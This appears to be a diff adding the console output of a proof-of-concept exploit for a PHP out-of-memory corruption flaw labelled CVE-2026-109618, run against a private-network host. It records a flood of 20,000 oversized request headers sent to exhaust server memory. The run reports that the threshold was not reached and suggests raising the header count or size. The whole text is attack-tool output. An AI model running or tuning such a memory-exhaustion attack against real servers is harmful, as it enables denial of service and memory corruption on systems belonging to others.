@@ -1,0 +1,13 @@
+CVE-2026-109618 — PHP OOM Corruption POC
+Target: 10.20.0.226:8091/
+Strategy: headers
+
+Sending 20000 headers × 2000 bytes each
+Wire size: ~38MB, Estimated PHP memory: ~154MB
+
+Sending...
+Response: HTTP/1.1 200 OK
+Size: 382 bytes
+
+[-] Server responded normally — OOM threshold not reached.
+    Try increasing --num-headers or --header-size
